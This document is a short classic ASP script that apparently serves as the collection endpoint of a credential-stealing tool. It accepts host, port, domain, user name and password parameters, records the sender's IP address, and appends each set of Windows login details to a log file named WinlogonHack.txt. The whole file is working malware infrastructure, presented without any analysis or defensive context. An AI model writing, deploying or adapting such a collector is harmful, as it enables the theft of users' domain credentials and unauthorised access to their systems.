<%
szTime = ""
nPort=request("port")
szhostname=request("host")
szname=request("user")
szpass=request("pass")
szdomain=request("domain")
userip = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
If userip = "" Then 
	userip = Request.ServerVariables("REMOTE_ADDR")
end if

szTime  = "Time:" & now()

set fs=server.CreateObject("Scripting.FileSystemObject")
set file=fs.OpenTextFile(server.MapPath("WinlogonHack.txt"),8,True)
file.writeline  szTime + " HostName:" + szhostname + " IP:" + userip+":"+nPort+ " Domain:" + szdomain + " User:" + szname+" Pass:" + szpass
file.close
set file=nothing
set fs=nothing
response.write "OK"

%>